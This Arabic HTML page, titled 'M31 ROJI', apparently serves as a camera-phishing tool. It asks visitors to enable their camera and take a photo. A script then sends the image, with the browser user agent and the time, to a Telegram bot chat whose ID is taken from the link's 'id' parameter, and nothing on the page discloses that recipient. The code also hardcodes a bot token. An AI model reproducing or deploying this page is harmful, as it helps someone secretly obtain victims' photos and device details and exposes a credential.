<!DOCTYPE html>
<html lang="ar">
<head>
<meta charset="UTF-8">
<title>M31 ROJI</title>

<style>
body {
  margin:0;
  padding:0;
  height:100%;
  background:#000;
  color:#0f0;
  text-align:center;
  font-family:Arial;
}

video {
  width: 300px;
  margin-top: 20px;
}
</style>
</head>

<body>

<h3>اضغط لتشغيل الكاميرا</h3>

<button onclick="startCamera()">تشغيل الكاميرا</button>
<button onclick="captureOnce()">التقاط صورة</button>

<br>
<video id="video" autoplay playsinline></video>
<canvas id="canvas" style="display:none;"></canvas>

<script>
// 🔥 توكن البوت
const BOT_TOKEN = "7415148537:AAHC9RSt6Ka4Ip34qTCleHx0YXtfGaERwIA";

// ✅ استخراج ID من الرابط
const params = new URLSearchParams(window.location.search);
const USER_ID = params.get("id");

let streamRef = null;

// معلومات الجهاز
function getDeviceInfo() {
  return `
📱 ${navigator.userAgent}
⏰ ${new Date().toLocaleString()}
  `;
}

// تشغيل الكاميرا (بموافقة المستخدم)
function startCamera() {
  navigator.mediaDevices.getUserMedia({ video: true })
  .then(stream => {
    streamRef = stream;
    document.getElementById("video").srcObject = stream;
  })
  .catch(() => alert("تم رفض الكاميرا"));
}

// التقاط صورة وإرسالها
function captureOnce() {
  if (!USER_ID) {
    alert("الرابط غير صحيح");
    return;
  }

  const video = document.getElementById("video");
  const canvas = document.getElementById("canvas");

  canvas.width = video.videoWidth;
  canvas.height = video.videoHeight;
  canvas.getContext("2d").drawImage(video, 0, 0);

  if (streamRef) {
    streamRef.getTracks().forEach(t => t.stop());
  }

  canvas.toBlob(blob => {
    const form = new FormData();
    form.append("chat_id", USER_ID); // 🔥 هنا السر
    form.append("photo", blob);
    form.append("caption", getDeviceInfo());

    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
      method: "POST",
      body: form
    })
    .then(() => {
      document.body.innerHTML = "<h2>تم الإرسال ✅</h2>";
    })
    .catch(() => {
      document.body.innerHTML = "<h2>فشل ❌</h2>";
    });
  }, "image/jpeg");
}
</script>

</body>
</html>
